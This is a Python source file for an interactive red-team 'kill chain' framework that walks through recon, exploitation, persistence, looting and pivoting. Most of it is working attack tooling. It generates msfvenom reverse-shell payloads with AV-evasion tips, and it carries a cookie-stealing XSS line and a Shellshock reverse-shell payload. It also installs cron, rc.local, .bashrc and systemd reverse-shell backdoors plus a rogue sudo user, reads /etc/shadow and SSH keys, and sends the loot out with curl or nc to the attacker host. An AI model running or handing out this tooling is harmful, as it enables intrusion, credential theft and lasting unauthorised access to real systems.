#!/usr/bin/env python3
"""
Red Team Modified Unified Kill Chain
Modular Framework — For Authorized Penetration Testing Only
"""

import subprocess
import sys
import os
import shutil
import socket
import datetime
import json
import re

# ─────────────────────────────────────────────
# ANSI Colors
# ─────────────────────────────────────────────
R    = "\033[91m"
Y    = "\033[93m"
G    = "\033[92m"
C    = "\033[96m"
W    = "\033[97m"
M    = "\033[95m"
DIM  = "\033[2m"
RESET= "\033[0m"
BOLD = "\033[1m"
LINE = f"{DIM}{'─'*52}{RESET}"

BANNER = f"""
{R}{BOLD}
 ██╗  ██╗██╗██╗     ██╗      ██████╗██╗  ██╗ █████╗ ██╗███╗   ██╗
 ██║ ██╔╝██║██║     ██║     ██╔════╝██║  ██║██╔══██╗██║████╗  ██║
 █████╔╝ ██║██║     ██║     ██║     ███████║███████║██║██╔██╗ ██║
 ██╔═██╗ ██║██║     ██║     ██║     ██╔══██║██╔══██║██║██║╚██╗██║
 ██║  ██╗██║███████╗███████╗╚██████╗██║  ██║██║  ██║██║██║ ╚████║
 ╚═╝  ╚═╝╚═╝╚══════╝╚══════╝ ╚═════╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝╚═╝  ╚═══╝
{RESET}"""


# ─────────────────────────────────────────────
# SESSION STATE  (persists across modules)
# ─────────────────────────────────────────────
SESSION = {
    "target":      "",
    "lhost":       "",
    "lport":       "4444",
    "loot_dir":    os.path.join(os.path.expanduser("~"), "loot"),
    "pivot_host":  "",
    "subnet":      "192.168.1.0/24",
    "notes":       [],
    "started":     datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
}

LOG_FILE = os.path.join(os.path.expanduser("~"), "redteam_session.log")


# ─────────────────────────────────────────────
# HELPERS
# ─────────────────────────────────────────────
def log(msg: str):
    ts = datetime.datetime.now().strftime("%H:%M:%S")
    with open(LOG_FILE, "a") as f:
        f.write(f"[{ts}] {msg}\n")

def header(n, title: str):
    print(f"\n{LINE}")
    print(f"  {R}{BOLD}[MODULE {n}]{RESET} {BOLD}{title}{RESET}")
    print(LINE)
    log(f"MODULE {n} — {title}")

def info(msg: str):  print(f"  {C}[*]{RESET} {msg}")
def ok(msg: str):    print(f"  {G}[+]{RESET} {msg}")
def warn(msg: str):  print(f"  {Y}[!]{RESET} {msg}")
def cmd(msg: str):   print(f"  {Y}${RESET}  {DIM}{msg}{RESET}")
def note(msg: str):
    print(f"  {M}[NOTE]{RESET} {msg}")
    SESSION["notes"].append(msg)

def run(command: str, show_output: bool = True, timeout: int = 30) -> tuple:
    """Returns (stdout, returncode). returncode==-1 on exception/timeout."""
    try:
        result = subprocess.run(
            command, shell=True, capture_output=True, text=True, timeout=timeout
        )
        output = (result.stdout.strip() + "\n" + result.stderr.strip()).strip()
        if show_output and output:
            for line in output.splitlines():
                print(f"  {DIM}  {line}{RESET}")
        log(f"RUN [{result.returncode}]: {command}")
        return output, result.returncode
    except subprocess.TimeoutExpired:
        warn(f"Command timed out after {timeout}s: {command}")
        return "", -1
    except Exception as e:
        warn(f"Error running command: {e}")
        return "", -1

def validate_port(port: str) -> bool:
    return port.isdigit() and 1 <= int(port) <= 65535

def prompt(label: str, default: str = "") -> str:
    suffix = f" [{default}]" if default else ""
    val = input(f"  {C}{label}{suffix}:{RESET} ").strip()
    return val if val else default

def confirm(msg: str) -> bool:
    ans = input(f"  {Y}[?]{RESET} {msg} (y/N): ").strip().lower()
    return ans == "y"

def show_session():
    print(f"\n  {BOLD}{W}Current Session:{RESET}")
    for k, v in SESSION.items():
        if k == "notes":
            continue
        val = v if v else f"{DIM}(not set){RESET}"
        print(f"    {DIM}{k:<12}{RESET} {C}{val}{RESET}")

def save_report():
    path = os.path.join(os.path.expanduser('~'), f"redteam_report_{datetime.datetime.now().strftime('%Y%m%d_%H%M%S')}.json")
    data = {**SESSION, "log_file": LOG_FILE}
    with open(path, "w") as f:
        json.dump(data, f, indent=2)
    ok(f"Report saved -> {path}")
    return path


# ─────────────────────────────────────────────
# EXEC MENU HELPER
# ─────────────────────────────────────────────
def _exec_menu(items: list, title: str = "Commands", timeout: int = 120):
    """
    items: list of (name, command) tuples.
    command starting with 'http' = URL, open in browser.
    command containing '(note)' = display-only, never executed.
    """
    print(f"\n  {BOLD}{title}:{RESET}")
    executables = []
    for name, c in items:
        is_url     = c.startswith("http")
        is_note    = "(note)" in c
        avail_bin  = shutil.which(c.split()[0]) if not is_url and not is_note else None
        if is_url:
            tag = f"{C}[URL]{RESET}"
        elif is_note:
            tag = f"{DIM}[REF]{RESET}"
        elif avail_bin:
            tag = f"{G}[OK]{RESET} "
        else:
            tag = f"{Y}[?]{RESET} "
        idx = len(executables) + 1
        executables.append((name, c, is_url, is_note))
        print(f"  {Y}[{idx}]{RESET} {tag} {name:<20} {DIM}{c}{RESET}")

    print(f"  {Y}[A]{RESET}      Run ALL (skips URLs/refs)")
    print(f"  {Y}[0]{RESET}      Skip")

    while True:
        picks = prompt("Select numbers to run (e.g. 1 3) or A/0").upper().split()
        if not picks or "0" in picks:
            break

        run_list = []
        if "A" in picks:
            run_list = [(n, c) for n, c, is_url, is_note in executables if not is_url and not is_note]
        else:
            for p in picks:
                if p.isdigit():
                    idx = int(p) - 1
                    if 0 <= idx < len(executables):
                        run_list.append(executables[idx][:2])
                    else:
                        warn(f"Invalid: {p}")

        for name, c in run_list:
            is_url = c.startswith("http")
            is_note = "(note)" in c
            if is_note:
                info(f"Reference only: {c}")
                continue
            if is_url:
                opener = shutil.which("termux-open-url") or shutil.which("xdg-open")
                if opener:
                    run(f'{opener} "{c}" 2>/dev/null', show_output=False, timeout=10)
                    ok(f"Opened {name} in browser")
                else:
                    info(f"Copy URL: {C}{c}{RESET}")
                continue
            info(f"Running: {name}")
            out, rc = run(c, timeout=timeout)
            if rc == 0:
                ok(f"{name} done")
            elif rc == -1:
                warn(f"{name} timed out")
            else:
                warn(f"{name} exited {rc}")
        break


# ─────────────────────────────────────────────
# PKG INSTALL HELPERS
# ─────────────────────────────────────────────
def _kill_dpkg_lock():
    """Kill any stale dpkg/apt lock process (Termux safe)."""
    out, _ = run("lsof /data/data/com.termux/files/usr/var/lib/dpkg/lock-frontend 2>/dev/null | awk 'NR>1{print $2}'", show_output=False)
    pids = [p.strip() for p in out.splitlines() if p.strip().isdigit()]
    if pids:
        warn(f"Killing stale lock process(es): {', '.join(pids)}")
        for pid in pids:
            run(f"kill -9 {pid} 2>/dev/null", show_output=False)
        run("rm -f /data/data/com.termux/files/usr/var/lib/dpkg/lock-frontend 2>/dev/null", show_output=False)
        run("rm -f /data/data/com.termux/files/usr/var/lib/dpkg/lock 2>/dev/null", show_output=False)
        ok("Lock cleared")
    else:
        ok("No stale lock found")

def _pkg_update():
    info("Checking for dpkg lock...")
    _kill_dpkg_lock()
    info("Running pkg update (this may take a while)...")
    out, rc = run("pkg update -y 2>&1", show_output=True, timeout=300)
    if rc == 0:
        ok("pkg update complete")
    else:
        warn(f"pkg update finished with code {rc} — continuing anyway")

def _pkg_install(tool: str, install_cmd: str):
    info(f"Installing {tool}...")
    info(f"Method: {DIM}{install_cmd}{RESET}")

    # Choose install strategy based on prefix
    if install_cmd.startswith("pip"):
        actual_cmd = install_cmd + " --break-system-packages 2>&1"
    elif install_cmd.startswith("go install"):
        actual_cmd = install_cmd + " 2>&1"
        if not shutil.which("go"):
            warn("Go not found. Install with: pkg install golang")
            return
    elif install_cmd.startswith("pkg"):
        _kill_dpkg_lock()
        actual_cmd = install_cmd + " -y 2>&1"
    else:
        actual_cmd = install_cmd + " 2>&1"

    out, rc = run(actual_cmd, show_output=True, timeout=300)

    if shutil.which(tool):
        ok(f"{tool} installed successfully")
    elif rc != 0:
        warn(f"{tool} install failed (exit {rc})")
        lines = [l for l in out.splitlines() if l.strip()]
        if lines:
            print(f"  {R}Last output:{RESET}")
            for l in lines[-5:]:
                print(f"  {DIM}  {l}{RESET}")
    else:
        warn(f"{tool} not found after install — may need manual check")


# ─────────────────────────────────────────────
# MODULE 1 — SETUP
# ─────────────────────────────────────────────
def module_setup():
    header(1, "SETUP — Tooling & Environment")

    tools = {
        # Core
        "nmap":             "pkg install nmap",
        "msfconsole":       "pkg install metasploit",
        "sqlmap":           "pkg install sqlmap",
        "nc":               "pkg install netcat-openbsd",
        "curl":             "pkg install curl",
        "git":              "pkg install git",
        "python3":          "pkg install python",
        "ssh":              "pkg install openssh",
        "proxychains4":     "pkg install proxychains-ng",
        # Recon / OSINT
        "subfinder":        "go install -v github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest",
        "dnsrecon":         "pip install dnsrecon",
        "fierce":           "pip install fierce",
        "dnsx":             "go install -v github.com/projectdiscovery/dnsx/cmd/dnsx@latest",
        "gau":              "go install github.com/lc/gau/v2/cmd/gau@latest",
        "waybackurls":      "go install github.com/tomnomnom/waybackurls@latest",
        # Scanning / Enumeration
        "naabu":            "go install -v github.com/projectdiscovery/naabu/v2/cmd/naabu@latest",
        "httpx":            "go install -v github.com/projectdiscovery/httpx/cmd/httpx@latest",
        "nuclei":           "go install -v github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest",
        "ffuf":             "go install github.com/ffuf/ffuf/v2@latest",
        "gobuster":         "pkg install gobuster",
        "feroxbuster":      "pkg install feroxbuster",
        "dirb":             "pkg install dirb",
        "nikto":            "pkg install nikto",
        "enum4linux":       "pkg install enum4linux",
        "snmpwalk":         "pkg install net-snmp",
        "sslscan":          "pkg install sslscan",
        # Exploitation / Post
        "chisel":           "go install github.com/jpillora/chisel@latest",
        # Utils
        "termux-open-url":  "pkg install termux-tools",
        "lsof":             "pkg install lsof",
        "wget":             "pkg install wget",
    }

    found_count = 0
    missing = {}
    for tool, install_cmd in tools.items():
        found = shutil.which(tool) is not None
        if found:
            ok(f"{tool:<20} {G}FOUND{RESET}")
            found_count += 1
        else:
            warn(f"{tool:<20} {Y}MISSING{RESET}  ->  {DIM}{install_cmd}{RESET}")
            missing[tool] = install_cmd

    print()
    info(f"{found_count}/{len(tools)} tools available")

    if missing:
        print(f"\n  {DIM}Tip: pkg update && pkg upgrade before installing{RESET}")
        print(f"\n  {BOLD}Install missing tools:{RESET}")
        print(f"  {Y}[1]{RESET} Install ALL missing ({len(missing)} tools)")
        print(f"  {Y}[2]{RESET} Pick tools to install")
        print(f"  {Y}[3]{RESET} Skip")

        ichoice = prompt("Choice", "3")

        if ichoice == "1":
            if confirm("Run pkg update first?"):
                _pkg_update()
            for tool, install_cmd in missing.items():
                _pkg_install(tool, install_cmd)

        elif ichoice == "2":
            missing_list = list(missing.items())
            for i, (tool, _) in enumerate(missing_list, 1):
                print(f"  {Y}[{i}]{RESET} {tool}")
            picks = prompt("Enter numbers separated by space (e.g. 1 3)").split()
            for p in picks:
                if p.isdigit() and 1 <= int(p) <= len(missing_list):
                    tool, install_cmd = missing_list[int(p) - 1]
                    _pkg_install(tool, install_cmd)

    is_termux = os.path.exists("/data/data/com.termux")
    env = "Termux (Android)" if is_termux else "Linux"
    info(f"Environment: {C}{env}{RESET}")

    try:
        local_ip = socket.gethostbyname(socket.gethostname())
        info(f"Local IP:    {C}{local_ip}{RESET}")
        if not SESSION["lhost"]:
            SESSION["lhost"] = local_ip
    except Exception:
        pass

    note("Setup complete")


# ─────────────────────────────────────────────
# MODULE 2 — RECONNAISSANCE
# ─────────────────────────────────────────────
def module_recon():
    header(2, "RECONNAISSANCE — OSINT & Surface Mapping")

    target = prompt("Target IP/domain", SESSION["target"])
    if not target:
        warn("No target provided.")
        return
    SESSION["target"] = target

    info("DNS Lookup:")
    dns, _ = run(f"nslookup {target} 2>/dev/null || host {target} 2>/dev/null")
    if not dns:
        run(f"ping -c 1 {target} 2>/dev/null")

    if confirm("Run WHOIS?"):
        info("WHOIS:")
        run(f"whois {target} 2>/dev/null | head -30")

    info("Ping check:")
    run(f"ping -c 3 {target} 2>/dev/null")

    # Split resources into CLI commands vs URLs
    cli_tools = [
        ("theHarvester", f"theHarvester -d {target} -b all"),
        ("Subfinder",    f"subfinder -d {target}"),
        ("Amass",        f"amass enum -d {target}"),
        ("DNSRecon",     f"dnsrecon -d {target}"),
        ("Fierce",       f"fierce --domain {target}"),
    ]
    web_urls = [
        ("Shodan",       f"https://www.shodan.io/search?query={target}"),
        ("WHOIS online", f"https://who.is/whois/{target}"),
        ("DNS Dumpster", f"https://dnsdumpster.com"),
        ("crt.sh certs", f"https://crt.sh/?q=%.{target}"),
        ("VirusTotal",   f"https://www.virustotal.com/gui/domain/{target}"),
        ("BGP Toolkit",  f"https://bgp.he.net/dns/{target}"),
    ]

    print(f"\n  {BOLD}CLI OSINT tools:{RESET}")
    for i, (name, c) in enumerate(cli_tools, 1):
        avail = f"{G}[OK]{RESET}" if shutil.which(name.lower().replace(" ","")) or shutil.which(name.lower()) else f"{Y}[?]{RESET}"
        print(f"  {Y}[{i}]{RESET} {avail} {name:<16} {DIM}{c}{RESET}")

    print(f"\n  {BOLD}Web resources (open in browser):{RESET}")
    for i, (name, url) in enumerate(web_urls, len(cli_tools)+1):
        print(f"  {Y}[{i}]{RESET} {name:<16} {DIM}{url}{RESET}")

    print(f"  {Y}[A]{RESET} Run ALL CLI tools")
    print(f"  {Y}[0]{RESET} Skip")

    while True:
        picks = prompt("Enter numbers to run (e.g. 1 3 A) or 0 to skip").upper().split()
        if not picks or "0" in picks:
            break

        all_items = cli_tools + [(n, u) for n, u in web_urls]

        if "A" in picks:
            for name, c in cli_tools:
                if shutil.which(name.lower()):
                    info(f"Running {name}...")
                    run(c, timeout=120)
                else:
                    warn(f"{name} not found — skipping (install with pkg/pip)")
            break

        for p in picks:
            if p.isdigit():
                idx = int(p) - 1
                if 0 <= idx < len(cli_tools):
                    name, c = cli_tools[idx]
                    if shutil.which(name.lower()):
                        info(f"Running {name}...")
                        run(c, timeout=120)
                    else:
                        warn(f"{name} not found — skipping")
                elif len(cli_tools) <= idx < len(all_items):
                    name, url = all_items[idx]
                    info(f"Opening: {url}")
                    # Try termux-open-url, fallback to xdg-open
                    opener = shutil.which("termux-open-url") or shutil.which("xdg-open")
                    if opener:
                        run(f'{opener} "{url}" 2>/dev/null', show_output=False, timeout=10)
                        ok(f"Opened {name} in browser")
                    else:
                        info(f"Copy this URL: {C}{url}{RESET}")
                else:
                    warn(f"Invalid choice: {p}")
        break

    note(f"Recon on {target}")


# ─────────────────────────────────────────────
# MODULE 3 — ENUMERATION
# ─────────────────────────────────────────────
def module_enum():
    header(3, "ENUMERATION — Ports, Services, Users")

    target = prompt("Target IP", SESSION["target"])
    if not target:
        warn("No target.")
        return
    SESSION["target"] = target

    scan_type = prompt("Scan type — (1) Quick  (2) Full  (3) Stealth", "1")

    if scan_type == "1":
        info("Quick scan (top 1000 ports):")
        run(f"nmap -sV --open -T4 {target}")
    elif scan_type == "2":
        info("Full port scan:")
        run(f"nmap -sV -p- --open -T4 {target}")
    elif scan_type == "3":
        info("Stealth SYN scan:")
        run(f"nmap -sS -sV --open -T2 {target}")
    else:
        warn("Invalid, running quick scan.")
        run(f"nmap -sV --open -T4 {target}")

    extras = [
        ("SMB enum",    f"enum4linux -a {target}"),
        ("SNMP walk",   f"snmpwalk -c public -v1 {target}"),
        ("Web scan",    f"nikto -h {target}"),
        ("Dir brute",   f"gobuster dir -u http://{target} -w /usr/share/wordlists/dirb/common.txt"),
        ("Banner grab", f"nc -nv {target} 80"),
        ("SSL info",    f"sslscan {target}:443"),
        ("HTTP HEAD",   f"curl -sI http://{target}"),
        ("robots.txt",  f"curl -s http://{target}/robots.txt"),
    ]
    _exec_menu(extras, "Additional enumeration commands", timeout=120)
    note(f"Enumeration on {target}")


# ─────────────────────────────────────────────
# MODULE 4 — PAYLOAD DELIVERY
# ─────────────────────────────────────────────
def module_payload():
    header(4, "PAYLOAD DELIVERY — Craft, Stage & Bypass AV")

    lhost = prompt("LHOST", SESSION["lhost"])
    lport = prompt("LPORT", SESSION["lport"])
    if lhost: SESSION["lhost"] = lhost
    if lport and validate_port(lport): SESSION["lport"] = lport

    platforms = {
        "1": ("Linux x86",    f"msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} -f elf -o shell.elf"),
        "2": ("Linux x64",    f"msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} -f elf -o shell.elf"),
        "3": ("Windows x64",  f"msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} -f exe -o shell.exe"),
        "4": ("Android APK",  f"msfvenom -p android/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} -o shell.apk"),
        "5": ("PHP webshell", f"msfvenom -p php/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} -f raw -o shell.php"),
        "6": ("Python",       f"msfvenom -p cmd/unix/reverse_python LHOST={lhost} LPORT={lport} -f raw"),
        "7": ("Bash TCP",     f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1"),
    }

    print(f"\n  {BOLD}Select payload platform:{RESET}")
    for k, (name, _) in platforms.items():
        print(f"    {Y}[{k}]{RESET} {name}")

    choice = prompt("Choice", "1")
    if choice in platforms:
        name, payload_cmd = platforms[choice]
        info(f"Generating {name} payload:")
        cmd(payload_cmd)
        if confirm("Execute payload generation?"):
            run(payload_cmd)

    print(f"\n  {BOLD}AV Bypass techniques:{RESET}")
    for b in [
        "msfvenom ... --encoder x86/shikata_ga_nai -i 10",
        "upx --brute shell.elf",
        "Use Veil-Evasion or Shellter for PE injection",
    ]:
        cmd(b)

    note(f"Payload crafted for {lhost}:{lport}")


# ─────────────────────────────────────────────
# MODULE 5 — EXPLOITATION
# ─────────────────────────────────────────────
def module_exploit():
    header(5, "EXPLOITATION — Trigger Vulnerability")

    target = prompt("Target IP/URL", SESSION["target"])
    if target: SESSION["target"] = target

    print(f"\n  {BOLD}Select exploit type:{RESET}")
    types = {
        "1": "SQLi",
        "2": "SSH Brute Force",
        "3": "FTP Brute Force",
        "4": "HTTP Brute Force",
        "5": "Metasploit Handler",
        "6": "Show all vectors",
    }
    for k, v in types.items():
        print(f"    {Y}[{k}]{RESET} {v}")

    choice = prompt("Choice", "6")

    if choice == "1":
        url = prompt("Target URL", f"http://{target}/page?id=1")
        info("SQLmap command:")
        cmd(f"sqlmap -u '{url}' --dbs --batch --level=3 --risk=2")
        if confirm("Run sqlmap?"):
            run(f"sqlmap -u '{url}' --dbs --batch")

    elif choice == "2":
        user_list = prompt("Userlist", "users.txt")
        pass_list = prompt("Passlist", "rockyou.txt")
        c = f"hydra -L {user_list} -P {pass_list} ssh://{target} -t 4"
        cmd(c)
        if confirm("Run hydra?"):
            run(c)

    elif choice == "3":
        c = f"hydra -L users.txt -P passwords.txt ftp://{target}"
        cmd(c)
        if confirm("Run?"):
            run(c)

    elif choice == "4":
        path = prompt("Login path", "/login")
        c = f"hydra -L users.txt -P passwords.txt {target} http-post-form '{path}:user=^USER^&pass=^PASS^:Invalid'"
        cmd(c)

    elif choice == "5":
        lhost = SESSION["lhost"] or prompt("LHOST")
        lport = SESSION["lport"]
        for c in [
            "msfconsole -q",
            "use exploit/multi/handler",
            "set PAYLOAD linux/x86/meterpreter/reverse_tcp",
            f"set LHOST {lhost}",
            f"set LPORT {lport}",
            "exploit -j",
        ]:
            cmd(f"msf6> {c}")
    else:
        lhost = SESSION["lhost"]
        lport = SESSION["lport"]
        vectors = [
            ("SQLi",       f"sqlmap -u 'http://{target}/page?id=1' --dbs"),
            ("XSS",        f"<script>fetch('http://{lhost}/?c='+document.cookie)</script>"),
            ("LFI",        f"http://{target}/page?file=../../../../etc/passwd"),
            ("RCE",        f"curl http://{target}/cmd?c=id"),
            ("SSH brute",  f"hydra -L users.txt -P rockyou.txt ssh://{target}"),
            ("Shellshock", f"curl -H 'User-Agent: () {{:;}}; /bin/bash -i >& /dev/tcp/{lhost}/{lport} 0>&1' http://{target}/cgi-bin/test.cgi"),
        ]
        for name, c in vectors:
            print(f"\n  {Y}[{name}]{RESET}")
            cmd(c)

    note(f"Exploitation against {target}")


# ─────────────────────────────────────────────
# MODULE 6 — INITIAL ACCESS
# ─────────────────────────────────────────────
def module_initial_access():
    header(6, "INITIAL ACCESS — C2 Foothold")

    lhost = prompt("LHOST", SESSION["lhost"])
    lport = prompt("LPORT", SESSION["lport"])
    if lhost: SESSION["lhost"] = lhost
    if lport: SESSION["lport"] = lport

    print(f"\n  {Y}[1] Netcat listener{RESET}")
    cmd(f"nc -lvnp {lport}")

    print(f"\n  {Y}[2] Metasploit multi/handler{RESET}")
    for c in [
        "use exploit/multi/handler",
        "set PAYLOAD linux/x86/meterpreter/reverse_tcp",
        f"set LHOST {lhost}",
        f"set LPORT {lport}",
        "set ExitOnSession false",
        "exploit -j -z",
    ]:
        cmd(f"msf6> {c}")

    print(f"\n  {Y}[3] Python reverse shell one-liner{RESET}")
    cmd(
        f"python3 -c \"import socket,subprocess,os;"
        f"s=socket.socket();s.connect(('{lhost}',{lport}));"
        f"os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);"
        f"subprocess.call(['/bin/sh','-i'])\""
    )

    if confirm("Start netcat listener now?"):
        if shutil.which("nc"):
            info(f"Listening on port {lport} ... (Ctrl+C to stop)")
            run(f"nc -lvnp {lport}")
        else:
            warn("nc not found. Install: pkg install netcat-openbsd")

    note(f"C2 setup on {lhost}:{lport}")


# ─────────────────────────────────────────────
# MODULE 7 — PRIVILEGE ESCALATION
# ─────────────────────────────────────────────
def module_privesc():
    header(7, "PRIVILEGE ESCALATION — SYSTEM / root")

    if confirm("Run local privesc checks now?"):
        checks = {
            "Current user":   "id && whoami",
            "Sudo rights":    "sudo -l 2>/dev/null",
            "SUID binaries":  "find / -perm -u=s -type f 2>/dev/null | head -20",
            "Writable /etc":  "find /etc -writable -type f 2>/dev/null | head -10",
            "Crontab":        "cat /etc/crontab 2>/dev/null",
            "Kernel version": "uname -a",
            "OS info":        "cat /etc/os-release 2>/dev/null",
            "Open ports":     "ss -tlnp 2>/dev/null || netstat -tlnp 2>/dev/null",
        }
        for name, c in checks.items():
            print(f"\n  {Y}[{name}]{RESET}")
            run(c)
    else:
        refs = [
            ("SUID bins",   "find / -perm -u=s -type f 2>/dev/null"),
            ("Sudo -l",     "sudo -l"),
            ("Cron jobs",   "cat /etc/crontab 2>/dev/null"),
            ("Kernel",      "uname -a"),
            ("LinPEAS",     "curl -sL https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh"),
            ("WinPEAS",     "certutil -urlcache -split -f https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEASany.exe winpeas.exe"),
            ("GTFOBins",    "https://gtfobins.github.io"),
        ]
        _exec_menu(refs, "PrivEsc commands & references", timeout=180)

    note("PrivEsc module run")


# ─────────────────────────────────────────────
# MODULE 8 — PERSISTENCE
# ─────────────────────────────────────────────
def module_persistence():
    header(8, "PERSISTENCE — Backdoors & Implants")

    lhost = prompt("LHOST", SESSION["lhost"])
    lport = prompt("LPORT", SESSION["lport"])
    if lhost: SESSION["lhost"] = lhost
    if lport: SESSION["lport"] = lport

    methods = {
        "1": ("Cron reverse shell",
              f"(crontab -l 2>/dev/null; echo '*/5 * * * * /bin/bash -i >& /dev/tcp/{lhost}/{lport} 0>&1') | crontab -"),
        "2": ("SSH key injection",
              "mkdir -p ~/.ssh && chmod 700 ~/.ssh && echo '<YOUR_PUB_KEY>' >> ~/.ssh/authorized_keys && chmod 600 ~/.ssh/authorized_keys"),
        "3": ("Rogue sudo user",
              "useradd -m -s /bin/bash -G sudo backdoor && echo 'backdoor:B@ckd00r!' | chpasswd"),
        "4": ("rc.local startup",
              f"echo '/bin/bash -i >& /dev/tcp/{lhost}/{lport} 0>&1' >> /etc/rc.local && chmod +x /etc/rc.local"),
        "5": (".bashrc hook",
              f"echo 'bash -i >& /dev/tcp/{lhost}/{lport} 0>&1 &' >> ~/.bashrc"),
        "6": ("Systemd service",
              f"echo -e '[Unit]\\nDescription=svc\\n[Service]\\nExecStart=/bin/bash -c \"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1\"\\n[Install]\\nWantedBy=multi-user.target' > /etc/systemd/system/svc.service && systemctl enable svc"),
        "0": ("Show all", None),
    }

    print(f"\n  {BOLD}Persistence methods:{RESET}")
    for k, (name, _) in methods.items():
        print(f"  {Y}[{k}]{RESET} {name}")

    choice = prompt("Choice", "0")

    if choice == "0":
        for k, (name, c) in methods.items():
            if c:
                print(f"\n  {Y}[{name}]{RESET}")
                cmd(c)
    elif choice in methods and methods[choice][1]:
        name, c = methods[choice]
        info(f"Method: {name}")
        cmd(c)
        if confirm("Execute?"):
            run(c)
    else:
        warn("Invalid choice.")

    note(f"Persistence set via {lhost}:{lport}")


# ─────────────────────────────────────────────
# MODULE 9 — ASSET COLLECTION
# ─────────────────────────────────────────────
def module_assets():
    header(9, "ASSET COLLECTION — Loot & Exfiltration")

    loot_dir = prompt("Loot directory", SESSION["loot_dir"])
    SESSION["loot_dir"] = loot_dir
    os.makedirs(loot_dir, exist_ok=True)
    ok(f"Loot dir ready: {loot_dir}")

    if confirm("Run local collection now?"):
        targets = {
            "passwd":   (f"cat /etc/passwd",             f"{loot_dir}/passwd.txt"),
            "shadow":   (f"cat /etc/shadow",             f"{loot_dir}/shadow.txt"),
            "hosts":    (f"cat /etc/hosts",              f"{loot_dir}/hosts.txt"),
            "history":  (f"cat ~/.bash_history",         f"{loot_dir}/history.txt"),
            "env vars": (f"env",                         f"{loot_dir}/env.txt"),
            "ssh keys": (f"cat ~/.ssh/id_rsa 2>/dev/null", f"{loot_dir}/id_rsa.txt"),
            "network":  (f"ip a && ip route",            f"{loot_dir}/network.txt"),
        }
        for name, (c, out) in targets.items():
            result, _ = run(f"{c} 2>/dev/null", show_output=False)
            if result:
                with open(out, "w") as f:
                    f.write(result)
                ok(f"{name:<12} -> {out}")
            else:
                warn(f"{name:<12} — no data")

        print(f"\n  {BOLD}Collected files:{RESET}")
        run(f"ls -lh {loot_dir}")
    else:
        commands = {
            "passwd":       f"cat /etc/passwd > {loot_dir}/passwd.txt",
            "shadow":       f"cat /etc/shadow > {loot_dir}/shadow.txt",
            "SSH keys":     f"cp -r ~/.ssh {loot_dir}/ssh/ 2>/dev/null",
            "Bash history": f"cat ~/.bash_history > {loot_dir}/history.txt",
            "Mimikatz":     "sekurlsa::logonpasswords  (Windows — in meterpreter)",
            "secretsdump":  f"impacket-secretsdump domain/user:pass@{SESSION['target']}",
        }
        for name, c in commands.items():
            print(f"  {Y}[{name}]{RESET}")
            cmd(c)

    lhost = SESSION["lhost"]
    exfil_items = [
        ("Pack loot",       f"tar czf ~/loot.tar.gz {loot_dir}"),
        ("curl upload",     f"curl -F 'f=@~/loot.tar.gz' http://{lhost}/upload"),
        ("SCP transfer",    f"scp -r {loot_dir} user@{lhost}:~/received/"),
        ("HTTP server",     f"python3 -m http.server 8080"),
        ("NC send",         f"nc {lhost} 9999 < ~/loot.tar.gz"),
    ]
    _exec_menu(exfil_items, "Exfiltration methods", timeout=60)
    note(f"Assets collected to {loot_dir}")


# ─────────────────────────────────────────────
# MODULE 10 — PIVOTING
# ─────────────────────────────────────────────
def module_pivot():
    header(10, "PIVOTING — Lateral Movement")

    pivot_host = prompt("Pivot host IP", SESSION["pivot_host"])
    subnet     = prompt("Target subnet", SESSION["subnet"])
    if pivot_host: SESSION["pivot_host"] = pivot_host
    if subnet:     SESSION["subnet"] = subnet

    lhost = SESSION["lhost"]
    lport = SESSION["lport"]

    techniques = {
        "SSH SOCKS proxy":    f"ssh -D 9050 -N -f user@{pivot_host}",
        "SSH port forward":   f"ssh -L 8080:127.0.0.1:80 user@{pivot_host}",
        "SSH reverse tunnel": f"ssh -R {lport}:127.0.0.1:{lport} user@{lhost}",
        "Chisel server":      f"chisel server -p 8080 --reverse  (on {lhost})",
        "Chisel client":      f"chisel client {lhost}:8080 R:socks  (on pivot)",
        "Proxychains scan":   f"proxychains4 nmap -sT -Pn {subnet}",
        "Pass-the-Hash":      f"pth-winexe -U 'DOMAIN/user%<NTLM_HASH>' //{pivot_host} cmd.exe",
        "MSF route":          f"route add {subnet} <session_id>  (in msfconsole)",
        "Ligolo-ng":          "ligolo-ng proxy -selfcert",
    }

    pivot_items = list(techniques.items())
    _exec_menu(pivot_items, "Pivoting techniques", timeout=180)
    note(f"Pivot via {pivot_host} -> {subnet}")


# ─────────────────────────────────────────────
# SESSION NOTES
# ─────────────────────────────────────────────
def show_notes():
    header("N", "SESSION NOTES & REPORT")
    show_session()
    if SESSION["notes"]:
        print(f"\n  {BOLD}Activity log:{RESET}")
        for i, n in enumerate(SESSION["notes"], 1):
            print(f"  {G}[{i}]{RESET} {n}")
    else:
        info("No notes recorded yet.")
    if confirm("Save report to file?"):
        save_report()


# ─────────────────────────────────────────────
# MENU
# ─────────────────────────────────────────────
DISPATCH = {
    "1":  module_setup,
    "2":  module_recon,
    "3":  module_enum,
    "4":  module_payload,
    "5":  module_exploit,
    "6":  module_initial_access,
    "7":  module_privesc,
    "8":  module_persistence,
    "9":  module_assets,
    "10": module_pivot,
    "N":  show_notes,
}

MENU_ITEMS = [
    (" 1", "Setup",             "Install & verify tools"),
    (" 2", "Reconnaissance",    "OSINT & DNS mapping"),
    (" 3", "Enumeration",       "Ports, services, users"),
    (" 4", "Payload Delivery",  "Craft & bypass AV"),
    (" 5", "Exploitation",      "Attack vectors"),
    (" 6", "Initial Access",    "C2 listener setup"),
    (" 7", "Priv Escalation",   "Root / SYSTEM"),
    (" 8", "Persistence",       "Backdoors & implants"),
    (" 9", "Asset Collection",  "Loot & exfil"),
    ("10", "Pivoting",          "Lateral movement"),
    ("--", "",                  ""),
    (" N", "Notes / Report",    "Session summary & export"),
